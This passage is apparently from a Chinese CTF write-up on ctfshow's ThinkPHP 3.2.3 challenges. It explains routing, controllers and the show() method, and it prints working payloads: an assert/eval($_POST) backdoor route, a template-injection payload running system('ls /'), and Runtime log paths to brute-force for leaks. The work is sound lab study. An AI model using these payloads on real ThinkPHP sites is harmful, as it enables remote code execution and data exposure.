<p>正则路由下访问<code>http://serverName/Home/new/2013/03</code>则输出<code>year=2013&amp;month=03</code>，对应第四个路由规则</p>
</li>
<li><p>继续执行：</p>
<p>默认的情况下，使用闭包定义路由的话，一旦匹配到路由规则，执行完闭包方法之后，就会中止后续执行。</p>
<p>如果希望闭包函数执行后，后续的程序继续执行，可以在闭包函数中使用布尔类型的返回值，例如：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'hello/:name'</span> <span class="token operator">=></span> 
    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Hello,'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br/>'</span><span class="token punctuation">;</span>
        <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'PATH_INFO'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'blog/read/name/'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>	<span class="token comment">// 重新设置了$_SERVER['PATH_INFO']变量，交给后续的程序继续执行</span>
        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>	<span class="token comment">// 返回值是false，所以会继续执行控制器和操作的检测</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>假设blog控制器中的read操作方法代码如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'read,'</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token operator">.</span><span class="token string single-quoted-string">'!&lt;br/>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>访问<code>http://serverName/Home/hello/thinkphp</code>，则输出</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">Hello,thinkphp
read,thinkphp!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ul>
<hr>
<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>给了我们Application的附件</p>
<p>我们解压下来审计一下</p>
<p>先全局搜索一下URL_ROUTER_ON，在Common&#x2F;Conf&#x2F;config.php</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221003302749.png" alt="image-20231221003302749"></p>
<p>我们可以知道这里的路由规则是访问<code>ctfshow</code>路由，后面的两个参数会作为<code>call_user_func</code>函数的参数进行命令执行</p>
<p>那么我们可以直接调用system函数命令执行</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221003908235.png" alt="image-20231221003908235"></p>
<p>此时就有一个问题了，我们在路由里构造不出<code>/</code>，所以我们直接用<code>assert</code>回调后门</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">index<span class="token operator">.</span>php<span class="token operator">/</span>ctfshow<span class="token operator">/</span>assert<span class="token operator">/</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后post请求里传入参数1进行任意命令执行</p>
<hr>
<h1 id="web571（控制器）"><a href="#web571（控制器）" class="headerlink" title="web571（控制器）"></a>web571（控制器）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hello,黑客建立了控制器后门，你能找到吗<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>了解一下控制器：<a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1712">https://www.kancloud.cn/manual/thinkphp/1712</a></p>
<h2 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h2><blockquote>
<p>ThinkPHP的控制器是一个类，而操作则是控制器类的一个<strong>公共方法</strong></p>
</blockquote>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello,thinkphp!'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>Home\IndexController</code>类就代表了Home模块下的Index控制器，而hello操作就是<code>Home\IndexController</code>类的hello（公共）方法</p>
<p>所以访问<code>http://serverName/index.php/Home/Index/hello</code>，会输出<code>hello,thinkphp!</code></p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>必须是公共方法，尽量避免和系统的保留方法相冲突</p>
<p>保留方法：</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">display
get
show
fetch
theme
assign
error
success<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>设置操作方法的后缀：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'ACTION_SUFFIX'</span>         <span class="token operator">=></span>  <span class="token string single-quoted-string">'Action'</span><span class="token punctuation">,</span> <span class="token comment">// 操作方法后缀</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这样控制器的操作方法定义就为</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">listAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'list'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">helloAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'hello'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">testAction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注：后缀设置只是影响控制器类的定义，对URL访问没有影响</p>
<h3 id="前置后置操作"><a href="#前置后置操作" class="headerlink" title="前置后置操作"></a>前置后置操作</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>
    <span class="token comment">//前置操作方法</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_before_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'before&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'index&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//后置操作方法</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_after_index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'after&lt;br/>'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>访问<code>http://serverName/index.php/Home/Index/index</code>，则输出</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">before
index
after<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>注：</p>
<ol>
<li>如果当前的操作并没有定义操作方法，而是直接渲染模板文件，那么如果定义了前置和后置方法的话，依然会生效。真正有模板输出的可能仅仅是当前的操作，前置和后置操作一般情况是没有任何输出的。</li>
<li>需要注意的是，在有些方法里面使用了exit或者错误输出之类的话 有可能不会再执行后置方法了。例如，如果在当前操作里面调用了控制器类的error方法，那么将不会再执行后置操作，但是不影响success方法的后置方法执行。</li>
</ol>
<h3 id="Action参数绑定"><a href="#Action参数绑定" class="headerlink" title="Action参数绑定"></a>Action参数绑定</h3><blockquote>
<p>通过直接绑定URL地址中的变量作为操作方法的参数，可以简化方法的定义甚至路由的解析</p>
</blockquote>
<p>配置：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_PARAMS_BIND'</span>       <span class="token operator">=></span>  <span class="token constant boolean">true</span><span class="token punctuation">,</span> <span class="token comment">// URL变量绑定到操作方法作为参数</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><p>按变量名绑定（默认）：</p>
<p>demo：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">BlogController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'id='</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">archive</span><span class="token punctuation">(</span><span class="token variable">$year</span><span class="token operator">=</span><span class="token string single-quoted-string">'2013'</span><span class="token punctuation">,</span><span class="token variable">$month</span><span class="token operator">=</span><span class="token string single-quoted-string">'01'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'year='</span><span class="token operator">.</span><span class="token variable">$year</span><span class="token operator">.</span><span class="token string single-quoted-string">'&amp;month='</span><span class="token operator">.</span><span class="token variable">$month</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>url访问：</p>
<p><code>http://serverName/index.php/Home/Blog/read/id/5</code>，输出<code>id=5</code></p>
<p><code>http://serverName/index.php/Home/Blog/archive/year/2013/month/11</code>，输出<code>year=2013&amp;month=11</code></p>
<p>注：按照变量名进行参数绑定的参数必须和URL中传入的变量名称一致，但是参数顺序不需要一致</p>
<p>以下访问url等价</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php?s=/Home/Blog/archive/year/2013/month/11</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php?s=/Home/Blog/archive/month/11/year/2013</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php?c=Blog&amp;a=archive&amp;year=2013&amp;month=11</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>如果直接访问<code>http://serverName/index.php/Home/Blog/read/</code>没加id参数且id参数没有默认值的话会报错</p>
</li>
<li><p>按变量顺序绑定：（仅对PATHINFO地址有效）</p>
<p>配置：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_PARAMS_BIND_TYPE'</span>  <span class="token operator">=></span>  <span class="token number">1</span><span class="token punctuation">,</span> <span class="token comment">// 设置参数绑定按照变量顺序绑定</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问地址变为：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/Home/Blog/read/5</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//serverName/index.php/Home/Blog/archive/2013/11</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>输出和上面一样</p>
<p>但是如果改成<code>http://serverName/index.php/Home/Blog/archive/11/2013</code>，此时输出就会变成<code>year=11&amp;month=2013</code></p>
</li>
</ul>
<h3 id="其它配置"><a href="#其它配置" class="headerlink" title="其它配置"></a>其它配置</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token string single-quoted-string">'URL_HTML_SUFFIX'</span><span class="token operator">=></span><span class="token string single-quoted-string">'shtml'</span>	<span class="token comment">// 设置伪静态后缀</span>
<span class="token string single-quoted-string">'URL_CASE_INSENSITIVE'</span> <span class="token operator">=></span><span class="token constant boolean">true</span>	<span class="token comment">// URL访问不区分大小写</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="内置方法"><a href="#内置方法" class="headerlink" title="内置方法"></a>内置方法</h3><ul>
<li><p>U：动态的根据当前的URL设置生成对应的URL地址，确保项目在移植过程中不受环境的影响</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'地址表达式'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'参数'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'伪静态后缀'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'显示域名'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'User/add'</span><span class="token punctuation">)</span> <span class="token comment">// 生成User控制器的add操作的URL地址</span>
<span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Blog/read?id=1'</span><span class="token punctuation">)</span> <span class="token comment">// 生成Blog控制器的read操作 并且id为1的URL地址</span>
<span class="token function">U</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Admin/User/select'</span><span class="token punctuation">)</span> <span class="token comment">// 生成Admin模块的User控制器的select操作的URL地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>I：获取系统输入变量</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'变量类型.变量名/修饰符'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'默认值'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'过滤方法或正则'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'额外数据源'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 相当于 $_GET['id']</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.id'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 如果不存在$_GET['id'] 则返回0</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.name'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htmlspecialchars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 采用htmlspecialchars方法对$_GET['name'] 进行过滤，如果不存在则返回空字符串</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取整个$_GET 数组</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'post.name'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htmlspecialchars'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 采用htmlspecialchars方法对$_POST['name'] 进行过滤，如果不存在则返回空字符串</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'session.user_id'</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取$_SESSION['user_id'] 如果不存在则默认为0</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cookie.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取整个 $_COOKIE 数组</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'server.REQUEST_METHOD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取 $_SERVER['REQUEST_METHOD'] </span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'param.id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 自动判断当前请求类型</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'path.1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取URL参数（必须是PATHINFO模式），对http://serverName/index.php/New/2013/06/01，会输出2013</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'data.file1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">// 获取不支持的变量类型的读取</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ul>
<h3 id="变量过滤"><a href="#变量过滤" class="headerlink" title="变量过滤"></a>变量过滤</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 系统默认的变量过滤机制，也就说，I方法的所有获取变量如果没有设置过滤方法的话都会进行htmlspecialchars过滤</span>
<span class="token string single-quoted-string">'DEFAULT_FILTER'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">'htmlspecialchars'</span>
<span class="token function">I</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'get.name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 	<span class="token comment">// 等同于 htmlspecialchars($_GET['name'])</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>其余的自己看文档吧</p>
<hr>
<h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>审计代码</p>
<p>先看一下Home模块下的控制器IndexController.class.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token variable">$n</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'&lt;style type="text/css">*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; body&#123; background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.8em; font-size: 36px &#125; a,a:hover&#123;color:blue;&#125;&lt;/style>&lt;div style="padding: 24px 48px;"> &lt;h1>CTFshow&lt;/h1>&lt;p>thinkphp 专项训练&lt;/p>&lt;p>hello,'</span><span class="token operator">.</span><span class="token variable">$n</span><span class="token operator">.</span><span class="token string single-quoted-string">'黑客建立了控制器后门，你能找到吗&lt;/p>'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>可以发现这里实际上会接受一个参数n来调用show方法，这个方法是一个保留方法</p>
<h3 id="show方法渲染内容"><a href="#show方法渲染内容" class="headerlink" title="show方法渲染内容"></a>show方法渲染内容</h3><blockquote>
<p>如果没有定义任何模板文件，或者把模板内容存储到数据库中的话，就需要使用show方法来渲染输出了</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">show</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'渲染内容'</span><span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'字符编码'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'输出类型'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">// 例：</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">show</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'text/xml'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>show方法中的内容也可以支持模板解析</p>
<p>把Application文件丢到本地环境调试一下：</p>
<p>动态跟踪show方法</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221231514458.png" alt="image-20231221231514458"></p>
<p>一路跟踪display方法</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221231634150.png" alt="image-20231221231634150"></p>
<p>继续跟踪到fetch方法</p>
<p><img src="/blog/2023/11/18/ctfshow-ThinkPHP%E4%B8%93%E9%A2%98/image-20231221225742960.png" alt="image-20231221225742960"></p>
<p>可以发现这个方法中存在命令执行的部分</p>
<p>我们传入的n也就是content在<code>TMPL_ENGINE_TYPE</code>是php的情况下会进到eval函数中</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span> <span class="token operator">==</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">C</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'TMPL_ENGINE_TYPE'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 使用PHP原生模板</span>
    <span class="token variable">$_content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token punctuation">;</span>
    <span class="token comment">// 模板阵列变量分解成为独立变量</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tVar</span><span class="token punctuation">,</span> <span class="token constant">EXTR_OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 直接载入PHP模板</span>
    <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_content</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token keyword">include</span> <span class="token variable">$templateFile</span> <span class="token punctuation">:</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'?>'</span> <span class="token operator">.</span> <span class="token variable">$_content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>怎么让<code>TMPL_ENGINE_TYPE</code>为php呢，这里琢磨了一圈发现原来题目靶机的<code>TMPL_ENGINE_TYPE</code>是php，而我们本地能够命令执行则是因为生成的缓存文件被include了</p>
<p>那么最终的payload就是：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">http://050f2deb-9b96-4fe6-b5df-5af1c67aa8ce.challenge.ctf.show/index.php/home/index/index?n=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="web572（日志泄露）"><a href="#web572（日志泄露）" class="headerlink" title="web572（日志泄露）"></a>web572（日志泄露）</h1><p>版本3.2.3</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">hello,没有源码，如何获取黑客的蛛丝马迹？<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这题没给源码，猜测存在信息泄露</p>
<h2 id="日志泄露"><a href="#日志泄露" class="headerlink" title="日志泄露"></a>日志泄露</h2><blockquote>
<p>thinkphp在开启DEBUG的情况下会在Runtime目录下生成日志</p>
</blockquote>
<p>入口文件中可以开启调试模式：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// 开启调试模式</span>
<span class="token function">define</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'APP_DEBUG'</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>ThinkPHP3的日志一般会生成的位置</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/Runtime/Logs/
/App/Runtime/Logs/
/Application/Runtime/Logs/Admin/
/Application/Runtime/Logs/Home/
/Application/Runtime/Logs/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>而ThinkPHP5会生成在<code>/runtime/log/202105/17.log</code></p>
<h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><p>那么我们要做的就是，抓包直接爆破这个日志的日期</p>
<p>先访问当天的日志，测试发现在&#x2F;Application&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;下</p>
